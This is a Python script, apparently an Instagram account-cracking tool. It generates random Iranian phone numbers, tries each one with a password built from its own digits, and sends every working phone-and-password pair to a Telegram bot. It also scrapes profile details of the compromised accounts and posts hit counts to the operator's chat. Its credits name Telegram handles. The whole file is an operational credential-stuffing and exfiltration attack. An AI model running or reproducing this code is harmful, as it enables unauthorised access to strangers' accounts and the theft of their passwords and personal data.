import random 
import requests
import webbrowser
import os
from uuid import uuid4
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E = '\033[1;31m' #احمر
C = "\033[1;97m" #ابيض
Token = input(Z+"["+F+"⌯"+Z+"]"+X+ " Token TeLe"+Z+" :\n"+B)
Id = input(Z+"["+F+"⌯"+Z+"]"+X+ " ID TeLe"+Z+" :\n"+B)
start_msg = requests.post(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text=جاري الصيد").json()
id_msg = start_msg['result']['message_id']   
#file = input("combo : ")
#fuck = open(file, 'r')
Hit1=0
Bad1=0
Sceur1=0

Hit2=0
Bad2=0
Sceur2=0

Hit3=0
Bad3=0
Sceur3=0
while True:
	#user = fuck.readline().split('\n')[0]
	ran="0987654321"
	rang1="".join(random.choice(ran) for i in range(7))
	rang="".join(random.choice(ran) for i in range(7))
	rang2="".join(random.choice(ran) for i in range(7))
#	#Iran
#	U1= user.split(':')[0]
#	P2= user.split(':')[1]		 
	#iraq
	U1='+98913'+rang2
	P2=rang2
	
	U3='+98912'+rang2
	P4=rang2
	#تركيا
	U5='+98912'+rang2
	P6="0912"+rang2
	url="https://www.instagram.com/accounts/login/ajax/"
	headers={
'Host':'www.instagram.com',
'User-Agent':'Mozilla/5.0 (Windows NT 10.0;Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
'Accept':'*/*',	
	}
	data1={
"enc_password":"#PWD_INSTAGRAM_BROWSER:0:&:"+P2,
"username":U1,
"queryParams":"{}",
"optIntoOneTap":"false",
"stopDeletionNonce":"",
"trustedDeviceRecords":"{}"	
	}
	data2={	"enc_password":"#PWD_INSTAGRAM_BROWSER:0:&:"+P4,
"username":U3,
"queryParams":"{}",
"optIntoOneTap":"false",
"stopDeletionNonce":"",
"trustedDeviceRecords":"{}"	
	}
	data3={	"enc_password":"#PWD_INSTAGRAM_BROWSER:0:&:"+P6,
"username":U5,
"queryParams":"{}",
"optIntoOneTap":"false",
"stopDeletionNonce":"",
"trustedDeviceRecords":"{}"	
	}

	req1=requests.post(url,data=data1,		headers=headers)
	#print(req1.text)
	if '"authenticated":true'  in req1.text:
		QQ=(f"""
ᯓ phone : {U1}
ᯓ ᴘᴀss : {P2}
		""")
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(QQ)+"")
		lc = requests.post(cl)
		url_info='https://www.instagram.com/api/v1/accounts/login/'
		uid = str(uuid4())
		data_info = { 
        'uuid': uid,
       'password': P2,
       'username': U1,
    'device_id': uid,
    'from_reg': 'false',
    '_csrftoken': 'missing',
       'login_attempt_countn': '0'}
		headers_info={'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive',}
		response=requests.post(url_info,data=data_info,headers=headers_info).json()
		o= response["logged_in_user"]["username"]
		print(o)
		Hit1+=1
		
		username=o
		
		url_info0=(f"https://www.instagram.com/{username}/?__a=1")
		
		cookies = {'sessionid': '51793126617%3A0cYJtN9l5vyrpF%3A26'}
		headers_info0={'User-Agent': 'Instagram 64.0.0.14.96'}
		r=requests.get(url_info0,headers=headers_info0,cookies=cookies).json()
		following = r['graphql']['user']['edge_follow']['count']
		followes = r['graphql']['user']['edge_followed_by']['count']
		name=r['graphql']['user']['full_name']
		id=r['graphql']['user']['id']
		User=r['graphql']['user']['username']
		data=requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
		bio=r['graphql']['user']['biography']
		Date=data["data"]
		
		Hello=f"""
ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ name : {name}
ᯓ 𝚄𝚂𝙴𝚁 :  {username} 
ᯓ phone : {U1}
ᯓ ᴘᴀss : {P2}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 : {id}
ᯓ 𝙿𝙾𝚂𝚃 : 
ᯓ 𝙱𝙸𝙾 : {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {Date}
ᯓ ʟɪɴᴋ : https://instagram.com/{username}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
By : @aaalaaa - Tele : @DtDtDt
"""	
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(Hello)+"")
		lc = requests.post(cl)
	if '"message":"checkpoint_required"'in req1.text:
		Sceur1+=1
		
	if '"authenticated":false' in req1.text:
		Bad1+=1
		

	req2=requests.post(url,data=data2, 		headers=headers)		
	if '"authenticated":true'  in req2.text:
		QQ=(f"""
ᯓ phone : {U3}
ᯓ ᴘᴀss : {P4}
		""")
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(QQ)+"")
		lc = requests.post(cl)
		url_info='https://www.instagram.com/api/v1/accounts/login/'
		uid = str(uuid4())
		data_info = { 
        'uuid': uid,
       'password': P4,
       'username': U3,
    'device_id': uid,
    'from_reg': 'false',
    '_csrftoken': 'missing',
       'login_attempt_countn': '0'}
		headers_info={'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive',}
		response=requests.post(url_info,data=data_info,headers=headers_info).json()
		User= response["logged_in_user"]["username"]		
		Hit2+=1
	
		url_info0=(f"https://www.instagram.com/{User}/?__a=1")
		cookies = {'sessionid': '51793126617%3A0cYJtN9l5vyrpF%3A26'}
		headers_info0={'User-Agent': 'Instagram 64.0.0.14.96'}
		r=requests.get(url_info0,headers=headers_info0,cookies=cookies).json()
		following = r['graphql']['user']['edge_follow']['count']
		followes = r['graphql']['user']['edge_followed_by']['count']
		name=r['graphql']['user']['full_name']
		id=r['graphql']['user']['id']
		data=requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
		bio=r['graphql']['user']['biography']
		Date=data["data"]
		Hello=f"""
ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ name : {name}
ᯓ 𝚄𝚂𝙴𝚁 :  {User} 
ᯓ phone : {U3}
ᯓ ᴘᴀss : {P4}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 : {id}
ᯓ 𝙿𝙾𝚂𝚃 : 
ᯓ 𝙱𝙸𝙾 : {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {Date}
ᯓ ʟɪɴᴋ : https://instagram.com/{User}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
By : @aaalaaa - Tele : @DtDtDt
"""	
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(Hello)+"")
		lc = requests.post(cl)		
	if '"message":"checkpoint_required"'in req2:
		Sceur2+=1
	
	if '"authenticated":false' in req2.text:
		Bad2+=1         		
						
		
		
	req3=requests.post(url,data=data3, 		headers=headers)		
	if '"authenticated":true'  in req3.text:
		QQ=(f"""
ᯓ phone : {U5}
ᯓ ᴘᴀss : {P6}
		""")
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(QQ)+"")
		lc = requests.post(cl)
		url_info='https://www.instagram.com/api/v1/accounts/login/'
		uid = str(uuid4())
		data_info = { 
        'uuid': uid,
       'password': P6,
       'username': U5,
    'device_id': uid,
    'from_reg': 'false',
    '_csrftoken': 'missing',
       'login_attempt_countn': '0'}
		headers_info={'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US",
        "X-IG-Capabilities": "3brTvw==",
        "X-IG-Connection-Type": "WIFI",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        'Host': 'i.instagram.com',
        'Connection': 'keep-alive',}
		response=requests.post(url_info,data=data_info,headers=headers_info).json()
		User= response["logged_in_user"]["username"]		
		Hit3+=1
	
		url_info0=(f"https://www.instagram.com/{User}/?__a=1")
		cookies = {'sessionid': '51793126617%3A0cYJtN9l5vyrpF%3A26'}
		headers_info0={'User-Agent': 'Instagram 64.0.0.14.96'}
		r=requests.get(url_info0,headers=headers_info0,cookies=cookies).json()
		following = r['graphql']['user']['edge_follow']['count']
		followes = r['graphql']['user']['edge_followed_by']['count']
		name=r['graphql']['user']['full_name']
		id=r['graphql']['user']['id']
		data=requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()
		bio=r['graphql']['user']['biography']
		Date=data["data"]
		Hello=f"""
ᯓ ✅ 𝙰𝙲𝙲𝙾𝙺𝙽𝚃 𝙸𝙽𝚂𝚃𝙰𝙶𝙰𝚁𝙼 𝚂𝙴𝙲𝙴𝙺𝚁 
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ name : {name}
ᯓ 𝚄𝚂𝙴𝚁 :  {User} 
ᯓ phone : {U5}
ᯓ ᴘᴀss : {P6}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 : {id}
ᯓ 𝙿𝙾𝚂𝚃 : 
ᯓ 𝙱𝙸𝙾 : {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {Date}
ᯓ ʟɪɴᴋ : https://instagram.com/{User}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
By : @aaalaaa - Tele : @DtDtDt
"""	
		cl = (f"https://api.telegram.org/bot"+str(Token)+"/sendMessage?chat_id="+str(Id)+"&text="+str(Hello)+"")
		lc = requests.post(cl)		
	if '"message":"checkpoint_required"'in req3.text:
		Sceur3+=1
	
	if '"authenticated":false' in req3.text:
		Bad3+=1         
	Sceur=Sceur1+Sceur2+Sceur3
	Hit=Hit1+Hit2+Hit3
	Bad=Bad1+Bad2+Bad3
	
	os.system('cls' if os.name == 'nt' else 'clear')
	k=req1
	k1=req2
	k2=req3
	
	i=(f''' 
{C}
  {C}██{F}╗{C}███{F}╗   {C}██{F}╗{C}███████{F}╗{C}████████{F}╗ {C}█████{F}╗ 
  {C}██{F}║{C}████{F}╗  {C}██{F}║{C}██{F}╔════╝╚══{C}██{F}╔══╝{C}██{F}╔══{C}██{F}╗
  {C}██{F}║{C}██{F}╔{C}██{F}╗ {C}██{F}║{C}███████{F}╗   {C}██{F}║   {C}███████{F}║
  {C}██{F}║{C}██{F}║╚{C}██{F}╗{C}██{F}║╚════{C}██{F}║   {C}██{F}║   {C}██{F}╔══{C}██{F}║
  {C}██{F}║{C}██{F}║ ╚{C}████{F}║{C}███████{F}║   {C}██{F}║   {C}██{F}║  {C}██{F}║
  {F}╚═╝╚═╝  ╚═══╝╚══════╝   ╚╝   
\033[1;31m--------------------------------
\033[1;33m< \033[2;32mMy telegram channel ids tool alosh \033[1;33m>
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mTelegram      : @dtdtd
\033[1;31m[\033[2;32m⌯\033[1;31m] \033[1;97mDeveloper     : @aaalaaa
\033[1;31m--------------------------------

          \033[1;33m<\033[2;32m Iran \033[1;33m>                                                                                                                                                                
{E}({F}{U1}{E}) {B} ➥ {E}({F}{P2}{E})
{E}-------------------------------
{E}({X}➥{E}){X}secure{E} ➥  {X}{Sceur1}
{E}({F}➥{E}){F}Good{E} ➥  {F}{Hit1}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{Bad1}
{E}-------------------------------
{X}telegram {E}: {F}@aaalaaa

               
{E}({F}{U3}{E}) {B} ➥ {E}({F}{P4}{E})
{E}-------------------------------
{E}({X}➥{E}){X}secure{E} ➥  {X}{Sceur2}
{E}({F}➥{E}){F}Good{E} ➥  {F}{Hit2}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{Bad2}
{E}-------------------------------
{X}telegram {E}: {F}@aaalaaa                               

{E}({F}{U5}{E}) {B} ➥ {E}({F}{P6}{E})
{E}-------------------------------
{E}({X}➥{E}){X}secure{E} ➥  {X}{Sceur3}
{E}({F}➥{E}){F}Good{E} ➥  {F}{Hit3}
{E}({B}➥{E}){B}Bad{E} ➥ {B}{Bad3}
{E}-------------------------------
{X}telegram {E}: {F}@aaalaaa

                        
{E}-------------------------------
{E}({X}➥{E}){X} All secure{E} ➥  {X}{Sceur}
{E}({F}➥{E}){F} All Good{E} ➥  {F}{Hit}
{E}({B}➥{E}){B} All Bad{E} ➥ {B}{Bad}
{E}-------------------------------
{X}telegram {E}: {F}@aaalaaa                                                                         
{k}
{k1}
{k2}
                                       ''')    
                                    
	print(i)
	requests.post(f"https://api.telegram.org/bot{Token}/editmessagetext?chat_id={Id}&message_id={id_msg}&text=\n- 𝙽𝙴𝚆 𝙼𝚈 𝙰𝙻𝙾𝚂𝙷 𝙷𝙰𝙲𝙺\n.— — — — —  — — — — — . \n⌯  𝙷𝚊𝚌𝚔 : {Hit}\n⌯  𝙱𝙰𝙳 : {Bad}\n⌯  Sceur : {Sceur}\n. — — — — —  — — — — — .\nᯓ 𝚄𝚂𝙴𝚁 :  {U1} \nᯓ phone : {P2}\n. — — — — —  — — — — — .\nᯓ 𝚄𝚂𝙴𝚁 :  {U3} \nᯓ phone : {P4}\n. — — — — —  — — — — — .\nᯓ 𝚄𝚂𝙴𝚁 :  {U5} \nᯓ phone : {P6}\n. — — — — —  — — — — — .\n• Tele : @DtDtDt  ,  @aaalaaa")     
											